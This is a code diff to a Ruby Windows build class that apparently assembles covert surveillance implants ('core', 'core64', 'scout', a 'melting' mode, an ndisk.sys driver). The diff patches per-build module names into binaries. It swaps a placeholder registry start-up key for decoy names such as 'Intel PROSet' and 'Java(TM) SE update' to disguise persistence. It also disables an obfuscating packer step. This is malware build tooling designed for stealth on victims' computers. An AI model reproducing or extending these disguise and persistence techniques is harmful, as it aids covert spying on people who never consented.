@@ -62,6 +62,9 @@ class BuildWindows < Build
         marker = "Funcname"
         patch_func_names(content)
 
+        marker = 'dllname'
+       content.binary_patch 'MODUNAME', module_name('core')
+
         # the new registry key
         marker = "Registry key"
         content.binary_patch 'JklAKLjsd-asdjAIUHDUD823akklGDoak3nn34', reg_start_key(@factory.confkey).ljust(38, "\x00")
@@ -78,6 +81,9 @@ class BuildWindows < Build
         # patching for the function name
         marker = "Funcname"
         patch_func_names(content)
+
+        marker = 'dllname'
+        content.binary_patch 'MODUNAME', module_name('core64')
 
         # the new registry key
         marker = "Registry key"
@@ -96,8 +102,9 @@ class BuildWindows < Build
     patch_build_time('silent')
 
     # code obfuscator
-    CrossPlatform.exec path('packer32'), "#{path('core')}"
-    CrossPlatform.exec path('packer64'), "#{path('core64')}"
+    # TODO: use them!!!
+    #CrossPlatform.exec path('packer32'), "#{path('core')}"
+    #CrossPlatform.exec path('packer64'), "#{path('core64')}"
   end
 
   def scramble
@@ -143,6 +150,8 @@ class BuildWindows < Build
 
     # change the icon of the exec accordingly to the name
     customize_scout(@factory.confkey, params['icon']) if @scout
+
+    trace :debug, "Build: melting mode: #{melting_mode}"
 
     case melting_mode
       when :silent
@@ -266,7 +275,7 @@ class BuildWindows < Build
         f.puts "HSYS=ndisk.sys"
         f.puts "HKEY=#{key}"
         f.puts "MANIFEST=" + (@admin ? 'yes' : 'no')
-        f.puts "FUNC=" + @funcnames[5]
+        f.puts "FUNC=" + "#{@funcnames[5]},#{@funcnames[8]}"
         f.puts "INSTALLER=" + (@cooked ? 'no' : 'yes')
       end
       cook_param = '-C -R ' + path('') + ' -O ' + path('output')
@@ -324,7 +333,7 @@ class BuildWindows < Build
                                           (@codec ? path(@scrambled[:codec]) : 'null') +' '+
                                           @scrambled[:dir]+' '+
                                           (@admin ? '1' : '0') +' '+
-                                          @funcnames[5] +' '+
+                                          "#{@funcnames[5]},#{@funcnames[8]}" +' '+
                                           path('input') + ' ' +
                                           path('output')
     end
@@ -358,7 +367,9 @@ class BuildWindows < Build
   end
 
   def reg_start_key(seed)
-    fake_names = ['cicciopasticcio']
+    fake_names = ['Restore Point', 'Backup Status', 'HD Audio', 'HD Audio balance', 'Bluetooth Pairing',
+                  'Intel(R) Common Interface', 'Intel PROSet', 'Delayed launcher', 'Intel USB 3.0', 'Smart Connect',
+                  'Java(TM) SE update', 'Audio Background', 'Wifi Manager']
     fake_names[seed.ord % fake_names.size]
   end
 
@@ -463,6 +474,23 @@ class BuildWindows < Build
       content.binary_patch find, @funcnames[index] if content[find]
     end
     content
+  end
+
+  def module_name(file)
+    # take the first letter (ignore nums) of the log key
+    # it must be a letter since it's a function name
+    first_alpha = @factory.logkey.match(/[a-zA-Z]/)[0]
+
+    progressive = '0'
+
+    case file
+      when 'core'
+        progressive = ('A'.ord + (first_alpha.ord + 32) % 26).chr
+      when 'core64'
+        progressive = ('A'.ord + (first_alpha.ord + 64) % 26).chr
+    end
+
+    first_alpha + SecureRandom.hex(1) + progressive + LicenseManager.instance.limits[:magic][4..7]
   end
 
 end
